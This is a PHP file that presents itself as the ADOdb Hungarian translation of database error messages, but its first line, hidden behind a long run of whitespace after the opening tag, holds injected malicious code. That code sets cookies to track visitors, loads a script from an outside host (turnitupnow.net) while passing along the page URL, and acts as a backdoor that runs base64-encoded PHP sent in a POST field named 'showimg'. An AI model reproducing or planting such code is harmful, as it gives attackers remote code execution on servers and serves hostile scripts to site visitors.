<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

# Hungarian language, encoding by ISO 8859-2 charset (Iso Latin-2)
# Halászvári Gábor <g.halaszvari#portmax.hu>
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'hu',
            DB_ERROR                    => 'ismeretlen hiba',
            DB_ERROR_ALREADY_EXISTS     => 'már létezik',
            DB_ERROR_CANNOT_CREATE      => 'nem sikerült létrehozni',
            DB_ERROR_CANNOT_DELETE      => 'nem sikerült törölni',
            DB_ERROR_CANNOT_DROP        => 'nem sikerült eldobni',
            DB_ERROR_CONSTRAINT         => 'szabályok megszegése',
            DB_ERROR_DIVZERO            => 'osztás nullával',
            DB_ERROR_INVALID            => 'érvénytelen',
            DB_ERROR_INVALID_DATE       => 'érvénytelen dátum vagy idõ',
            DB_ERROR_INVALID_NUMBER     => 'érvénytelen szám',
            DB_ERROR_MISMATCH           => 'nem megfelelõ',
            DB_ERROR_NODBSELECTED       => 'nincs kiválasztott adatbázis',
            DB_ERROR_NOSUCHFIELD        => 'nincs ilyen mezõ',
            DB_ERROR_NOSUCHTABLE        => 'nincs ilyen tábla',
            DB_ERROR_NOT_CAPABLE        => 'DB backend nem támogatja',
            DB_ERROR_NOT_FOUND          => 'nem található',
            DB_ERROR_NOT_LOCKED         => 'nincs lezárva',
            DB_ERROR_SYNTAX             => 'szintaktikai hiba',
            DB_ERROR_UNSUPPORTED        => 'nem támogatott',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'soron végzett érték számlálás',
            DB_ERROR_INVALID_DSN        => 'hibás DSN',
            DB_ERROR_CONNECT_FAILED     => 'sikertelen csatlakozás',
            0	                       => 'nincs hiba', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'túl kevés az adat',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'bõvítmény nem található',
            DB_ERROR_NOSUCHDB           => 'nincs ilyen adatbázis',
            DB_ERROR_ACCESS_VIOLATION   => 'nincs jogosultság'
);
?>